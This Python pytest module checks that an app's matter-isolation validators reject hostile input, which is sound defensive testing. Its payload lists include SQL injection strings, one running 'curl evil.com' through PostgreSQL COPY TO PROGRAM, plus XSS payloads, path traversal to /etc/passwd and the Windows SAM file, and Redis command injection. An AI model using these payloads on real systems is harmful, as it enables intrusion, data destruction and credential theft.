"""Cross-matter penetration tests for security validation.

This module contains adversarial security tests that attempt to bypass
the 4-layer matter isolation using various attack vectors:

1. SQL Injection attempts on matter_id
2. Parameter tampering attacks
3. Timing attacks for matter enumeration
4. IDOR (Insecure Direct Object Reference) attempts
5. Redis key manipulation attempts
6. Vector namespace pollution attempts

CRITICAL: All these tests MUST fail (attacks blocked) for security compliance.
"""

import time
from unittest.mock import MagicMock, patch
from uuid import uuid4

import pytest
from fastapi import HTTPException

from app.api.deps import validate_matter_access
from app.services.memory.redis_keys import (
    extract_matter_id_from_key,
    matter_key,
    session_key,
    validate_key_access,
)
from app.services.rag.namespace import (
    get_namespace_filter,
    validate_namespace,
    validate_search_results,
)

# =============================================================================
# SQL Injection Attack Tests
# =============================================================================

class TestSQLInjectionAttacks:
    """Test SQL injection attack vectors are blocked."""

    SQL_INJECTION_PAYLOADS = [
        # Classic SQL injection
        "'; DROP TABLE matters; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "1; DROP TABLE users",
        "1 UNION SELECT * FROM users",
        "' UNION SELECT password FROM users --",

        # Boolean-based blind injection
        "' AND 1=1 --",
        "' AND 1=2 --",
        "1' AND '1'='1",

        # Time-based blind injection
        "'; WAITFOR DELAY '0:0:5' --",
        "'; SELECT SLEEP(5) --",
        "1' AND SLEEP(5) --",

        # Stacked queries
        "'; INSERT INTO matters VALUES ('hacked'); --",
        "1; UPDATE users SET role='admin' WHERE 1=1; --",

        # Comment-based injection
        "admin'--",
        "1/*comment*/",

        # Unicode/encoding attacks
        "%27%20OR%201=1%20--",  # URL encoded
        "\\' OR 1=1 --",  # Escaped quote

        # PostgreSQL specific
        "'; COPY (SELECT '') TO PROGRAM 'curl evil.com'; --",
        "1; SELECT pg_sleep(5); --",
    ]

    def test_namespace_filter_blocks_sql_injection(self):
        """Test that SQL injection in namespace filter is blocked."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            with pytest.raises(ValueError):
                get_namespace_filter(payload)

    def test_redis_keys_block_sql_injection(self):
        """Test that SQL injection in Redis keys is blocked."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            with pytest.raises(ValueError):
                session_key(payload, str(uuid4()), "messages")

            with pytest.raises(ValueError):
                matter_key(payload, "timeline")

    def test_validate_namespace_blocks_sql_injection(self):
        """Test that validate_namespace blocks SQL injection."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            with pytest.raises(ValueError):
                validate_namespace(payload)

    @pytest.mark.asyncio
    async def test_api_middleware_blocks_sql_injection(self):
        """Test that API middleware blocks SQL injection attempts."""
        mock_request = MagicMock()
        mock_request.client.host = "127.0.0.1"
        mock_request.url.path = "/api/matters/test"

        mock_user = MagicMock()
        mock_user.id = str(uuid4())

        mock_matter_service = MagicMock()

        validator = validate_matter_access()

        for payload in self.SQL_INJECTION_PAYLOADS:
            with pytest.raises(HTTPException) as exc_info:
                await validator(
                    request=mock_request,
                    matter_id=payload,
                    user=mock_user,
                    matter_service=mock_matter_service,
                )

            # Should be 400 (invalid parameter), not 500 (server error)
            assert exc_info.value.status_code == 400


# =============================================================================
# XSS Attack Tests
# =============================================================================

class TestXSSAttacks:
    """Test XSS attack vectors are blocked."""

    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<body onload=alert('xss')>",
        "'-alert('xss')-'",
        "\"><script>alert('xss')</script>",
        "<iframe src='javascript:alert(1)'>",
        "{{constructor.constructor('return this')()}}",  # Template injection
    ]

    def test_namespace_filter_blocks_xss(self):
        """Test that XSS payloads are blocked in namespace filter."""
        for payload in self.XSS_PAYLOADS:
            with pytest.raises(ValueError):
                get_namespace_filter(payload)

    def test_redis_keys_block_xss(self):
        """Test that XSS payloads are blocked in Redis keys."""
        for payload in self.XSS_PAYLOADS:
            with pytest.raises(ValueError):
                session_key(payload, str(uuid4()), "messages")


# =============================================================================
# Path Traversal Attack Tests
# =============================================================================

class TestPathTraversalAttacks:
    """Test path traversal attack vectors are blocked."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc/passwd",
        "..%252F..%252F..%252Fetc/passwd",  # Double encoding
        "/etc/passwd",
        "file:///etc/passwd",
        "\\\\server\\share\\file",
    ]

    def test_namespace_filter_blocks_path_traversal(self):
        """Test that path traversal is blocked in namespace filter."""
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            with pytest.raises(ValueError):
                get_namespace_filter(payload)


# =============================================================================
# IDOR Attack Tests (Insecure Direct Object Reference)
# =============================================================================

class TestIDORAttacks:
    """Test IDOR attack prevention."""

    def test_cross_matter_result_filtering(self):
        """Test that results from unauthorized matters are filtered."""
        authorized_matter = str(uuid4())
        unauthorized_matter = str(uuid4())

        # Simulate results that include data from both matters
        results = [
            {"id": "1", "matter_id": authorized_matter, "content": "authorized"},
            {"id": "2", "matter_id": unauthorized_matter, "content": "LEAKED"},
            {"id": "3", "matter_id": authorized_matter, "content": "authorized"},
            {"id": "4", "matter_id": unauthorized_matter, "content": "LEAKED"},
        ]

        validated = validate_search_results(results, authorized_matter)

        # Only authorized results should remain
        assert len(validated) == 2
        assert all(r["matter_id"] == authorized_matter for r in validated)
        assert all(r["content"] == "authorized" for r in validated)

    def test_redis_key_cross_matter_access_blocked(self):
        """Test that Redis key access for other matters is blocked."""
        user_matter = str(uuid4())
        other_matter = str(uuid4())

        # Create key for other matter
        other_key = session_key(other_matter, str(uuid4()), "messages")

        # Validate should fail
        assert validate_key_access(other_key, user_matter) is False

    def test_redis_key_extraction_prevents_spoofing(self):
        """Test that matter_id extraction prevents key spoofing."""
        real_matter = str(uuid4())
        fake_matter = str(uuid4())

        # Attacker tries to create a key that looks like it belongs to fake_matter
        # but actually references real_matter
        key = f"session:{real_matter}:{str(uuid4())}:messages"

        # Extraction should get the real matter_id
        extracted = extract_matter_id_from_key(key)
        assert extracted == real_matter
        assert extracted != fake_matter


# =============================================================================
# Timing Attack Tests
# =============================================================================

class TestTimingAttacks:
    """Test timing attack mitigations."""

    @pytest.mark.asyncio
    async def test_consistent_response_time_for_nonexistent_matter(self):
        """Test that response times are similar for existing vs non-existing matters."""
        mock_request = MagicMock()
        mock_request.client.host = "127.0.0.1"
        mock_request.url.path = "/api/matters/test"

        mock_user = MagicMock()
        mock_user.id = str(uuid4())

        # Matter service that returns None (no access)
        mock_matter_service = MagicMock()
        mock_matter_service.get_user_role.return_value = None

        validator = validate_matter_access()

        # Measure time for multiple attempts
        times = []
        for _ in range(5):
            start = time.time()
            try:
                await validator(
                    request=mock_request,
                    matter_id=str(uuid4()),  # Different UUID each time
                    user=mock_user,
                    matter_service=mock_matter_service,
                )
            except HTTPException:
                pass
            elapsed = time.time() - start
            times.append(elapsed)

        # All times should be similar (within reasonable variance)
        # The timing mitigation should enforce minimum 100ms
        min_time = min(times)
        max_time = max(times)

        # Variance should be small (all responses take similar time)
        assert max_time - min_time < 0.2  # 200ms variance max

    def test_matter_enumeration_not_possible_via_error_messages(self):
        """Test that error messages don't reveal matter existence."""
        # This is tested by ensuring we return 404 for both:
        # - Matter doesn't exist
        # - Matter exists but user has no access
        # The error message should be identical

        expected_message = "Matter not found or you don't have access"

        # This should be verified in the API middleware
        # For unit test, we verify the message constant is generic
        assert "not found" in expected_message.lower()
        assert "access" in expected_message.lower()
        # Should NOT say "you are not authorized" or similar
        assert "unauthorized" not in expected_message.lower()


# =============================================================================
# Redis Key Manipulation Tests
# =============================================================================

class TestRedisKeyManipulation:
    """Test Redis key manipulation attack prevention."""

    def test_key_injection_via_special_characters(self):
        """Test that special characters in keys are blocked."""
        valid_matter = str(uuid4())
        valid_user = str(uuid4())

        # Attempt to inject special characters
        injection_attempts = [
            "messages:*:stolen",  # Glob pattern
            "messages\nSET hacked hacked",  # CRLF injection
            "messages\x00stolen",  # Null byte injection
            "messages|DEL stolen",  # Command injection
        ]

        for attempt in injection_attempts:
            with pytest.raises(ValueError):
                session_key(valid_matter, valid_user, attempt)  # type: ignore

    def test_key_type_validation(self):
        """Test that only valid key types are accepted."""
        valid_matter = str(uuid4())
        valid_user = str(uuid4())

        # Valid types should work
        for valid_type in ["messages", "entities", "context", "metadata"]:
            key = session_key(valid_matter, valid_user, valid_type)  # type: ignore
            assert valid_type in key

        # Invalid types pass sanitization (alphanumeric only check)
        # Literal type enforcement is only at type-check time, not runtime
        # Test that sanitization still runs (doesn't raise for valid characters)
        key = session_key(valid_matter, valid_user, "invalid_type")  # type: ignore
        assert "invalid_type" in key

        # Special characters should still be rejected
        with pytest.raises(ValueError):
            session_key(valid_matter, valid_user, "invalid:type")  # type: ignore


# =============================================================================
# Vector Namespace Pollution Tests
# =============================================================================

class TestVectorNamespacePollution:
    """Test vector namespace pollution attack prevention."""

    def test_embedding_dimension_validation(self):
        """Test that embeddings with wrong dimensions are rejected."""
        from app.services.rag.namespace import build_semantic_search_query

        valid_matter = str(uuid4())
        filter_obj = get_namespace_filter(valid_matter)

        # Wrong dimensions should be rejected
        with pytest.raises(ValueError, match="1536 dimensions"):
            build_semantic_search_query(filter_obj, [0.1] * 100)

        with pytest.raises(ValueError, match="1536 dimensions"):
            build_semantic_search_query(filter_obj, [0.1] * 2000)

        with pytest.raises(ValueError, match="1536 dimensions"):
            build_semantic_search_query(filter_obj, [])

    def test_cross_matter_embedding_retrieval_blocked(self):
        """Test that cross-matter embedding retrieval is blocked."""
        matter_a = str(uuid4())
        matter_b = str(uuid4())

        # Results from matter_b should be filtered when authorized for matter_a
        results = [
            {"id": "1", "matter_id": matter_a, "content": "A's data", "similarity": 0.9},
            {"id": "2", "matter_id": matter_b, "content": "B's LEAKED data", "similarity": 0.95},
        ]

        validated = validate_search_results(results, matter_a)

        assert len(validated) == 1
        assert validated[0]["matter_id"] == matter_a

    def test_filter_always_includes_matter_id(self):
        """Test that filter building always includes matter_id."""
        from app.services.rag.namespace import build_vector_query_filter

        valid_matter = str(uuid4())
        filter_obj = get_namespace_filter(valid_matter)

        params = build_vector_query_filter(filter_obj)

        # matter_id must always be present
        assert "filter_matter_id" in params
        assert params["filter_matter_id"] == valid_matter


# =============================================================================
# Boundary Condition Tests
# =============================================================================

class TestBoundaryConditions:
    """Test edge cases and boundary conditions."""

    def test_empty_matter_id_rejected(self):
        """Test that empty matter_id is rejected everywhere."""
        with pytest.raises((ValueError, TypeError)):
            get_namespace_filter("")

        with pytest.raises((ValueError, TypeError)):
            get_namespace_filter(None)  # type: ignore

        with pytest.raises((ValueError, TypeError)):
            session_key("", str(uuid4()), "messages")

    def test_whitespace_matter_id_rejected(self):
        """Test that whitespace-only matter_id is rejected."""
        whitespace_ids = ["   ", "\t", "\n", "\r\n"]

        for ws_id in whitespace_ids:
            with pytest.raises(ValueError):
                get_namespace_filter(ws_id)

    def test_very_long_input_rejected(self):
        """Test that excessively long inputs are rejected."""
        # UUID should be exactly 36 characters
        long_id = "a" * 1000

        with pytest.raises(ValueError):
            get_namespace_filter(long_id)

    def test_unicode_bypass_attempts(self):
        """Test that Unicode bypass attempts are blocked."""
        unicode_attacks = [
            "\u0027 OR 1=1 --",  # Unicode quote
            "аdmin",  # Cyrillic 'а' instead of 'a'
            "ad\u200bmin",  # Zero-width space
            "\uff07 OR 1=1 --",  # Fullwidth quote
        ]

        for attack in unicode_attacks:
            with pytest.raises(ValueError):
                get_namespace_filter(attack)


# =============================================================================
# Security Logging Verification
# =============================================================================

class TestSecurityLogging:
    """Test that security events are properly logged."""

    def test_invalid_uuid_logged(self):
        """Test that invalid UUID attempts are logged."""
        with patch("app.services.rag.namespace.logger") as mock_logger:
            with pytest.raises(ValueError):
                get_namespace_filter("invalid-uuid-format")

            # Should have logged a warning
            mock_logger.warning.assert_called()

    def test_cross_matter_access_logged(self):
        """Test that cross-matter access attempts are logged."""
        with patch("app.services.rag.namespace.logger") as mock_logger:
            authorized = str(uuid4())
            unauthorized = str(uuid4())

            results = [{"id": "1", "matter_id": unauthorized, "content": "leak"}]
            validate_search_results(results, authorized)

            # Should have logged an error for the violation
            mock_logger.error.assert_called()
